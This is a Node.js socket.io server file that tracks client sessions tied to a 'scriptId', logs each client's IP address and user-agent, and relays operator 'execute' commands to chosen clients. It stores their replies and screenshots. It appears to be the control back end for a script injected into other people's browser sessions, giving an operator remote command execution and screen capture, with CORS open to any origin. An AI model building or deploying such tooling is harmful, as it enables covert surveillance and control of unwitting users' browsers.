const fs = require("fs");
const path = require("path");
const ejs = require("ejs");
const io = require("socket.io");
const logService = require("./services/logService");
const sessionsService = require("./services/sessionsService");
const historyService = require("./services/historyService");

module.exports = (httpServer) => {
  logService.debug("Socket.io server initialized");
  logService.debug(new Array(40).join("="));
  const IO = io(httpServer, { cors: { origin: "*" } });
  IO.on("connection", (socket) => {
    const state = {};
    logService.info("User connected");

    socket.on("disconnect", async () => {
      logService.info("User disconnected", state);

      if (state.type === "client") {
        if (state.id) {
          sessionsService.update(state.id, { status: "Closed" });
          const item = await historyService.create({
            type: "disconnect",
            sessionId: state.sessionId,
            content: "User disconnected",
          });
          IO.to(`admin:${state.sessionId}`).emit(
            "result",
            renderResultItem(item)
          );
        }
      } else if (state.type === "admin") {
        logService.info("Admin disconnected");
      }
    });

    socket.on("join", async ({ scriptId, sessionId }) => {
      state.type = "client";
      if (!sessionId || sessionId === "new") {
        const newSessionId = Math.random().toString(36).slice(2);
        logService.info(`User created session ${newSessionId}`);
        state.sessionId = newSessionId;
      } else {
        logService.info(`User joined session ${sessionId}`);
        state.sessionId = sessionId;
      }

      let existingSession = await sessionsService.getOne(state.sessionId);
      if (!existingSession) {
        existingSession = await sessionsService.create({
          name: "New session",
          status: "Active",
          description: "",
          time: new Date().toISOString(),
          ua: socket.handshake.headers["user-agent"],
          ip: socket.handshake.address,
          scriptId,
          sessionId: state.sessionId,
        });
      } else {
        await sessionsService.update(existingSession.id, {
          status: "Active",
          ua: socket.handshake.headers["user-agent"],
          ip: socket.handshake.address,
        });
      }

      state.id = existingSession.id;

      const item = await historyService.create({
        type: "connect",
        sessionId: state.sessionId,
        content: "User connected",
      });

      socket.join("client:" + state.sessionId);
      socket.emit("session", { sessionId: state.sessionId });
      IO.to(`admin:${item.sessionId}`).emit("result", renderResultItem(item));
    });

    socket.on("result", async ({ payload: { type, payload, commandId } }) => {
      let item = null;
      if (commandId === "new") {
        item = await historyService.create({
          sessionId: state.sessionId,
          type: "command",
          content: JSON.stringify({
            type: "execute",
            payload: "[PASTE]IMAGE[/PASTE]",
          }),
        });
      } else {
        item = await historyService.getOne(commandId);
      }
      if (item) {
        if (type === "screenshot") {
          const filepath = await saveImageToDisc({
            payload,
            id: item.id,
            sessionId: item.sessionId,
          });
          item.response = filepath;
          item.type = "screenshot";
        } else {
          item.response = payload;
        }
        await item.save();
        IO.to(`admin:${item.sessionId}`).emit("result", renderResultItem(item));
      }
    });

    socket.on("admin:join", ({ id }) => {
      state.type = "admin";
      socket.join(`admin:${id}`);
      logService.info("Admin joined");
    });

    socket.on("admin:command", async ({ id, message }) => {
      const item = await historyService.create({
        type: "command",
        sessionId: id,
        content: JSON.stringify(message),
      });
      message.commandId = item.id;
      IO.to(`client:${id}`).emit("command", message);
    });
  });
};

function renderResultItem(item) {
  const messagePartialPath = path.join(
    __dirname,
    "views",
    "partials",
    "message.ejs"
  );
  const messageContent = fs.readFileSync(messagePartialPath, "utf8");

  return ejs.render(messageContent, {
    msg: item,
  });
}

function saveImageToDisc({ payload, id, sessionId }) {
  const publicPath = path.join("public", "screenshots");
  if (!fs.existsSync(publicPath)) {
    fs.mkdirSync(publicPath);
  }

  const filename = path.join(
    publicPath,
    `${sessionId}_${id}_${Date.now()}.png`
  );

  fs.writeFileSync(filename, payload.split(";base64,").pop(), {
    encoding: "base64",
  });

  return filename.replace(/^public/, "");
}
